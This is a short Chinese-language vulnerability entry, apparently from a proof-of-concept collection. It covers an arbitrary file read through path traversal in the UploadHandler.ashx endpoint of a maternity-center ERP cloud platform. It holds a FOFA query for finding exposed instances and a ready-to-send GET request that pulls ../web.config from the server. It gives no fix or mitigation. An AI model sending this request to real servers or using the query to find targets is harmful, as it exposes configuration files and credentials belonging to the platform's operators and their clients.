## 月子会所ERP云管理平台 UploadHandler.ashx 任意文件读取漏洞

## 漏洞描述
月子会所ERP云管理平台 `UploadHandler.ashx` 接口存在任意文件读取，攻击者可利用路径穿越下载服务器敏感信息。

## 网络空间测绘
```
fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
```

## POC
```
GET /Page/upload/UploadHandler.ashx?url=../web.config HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
```

## 参考
- 社区情报

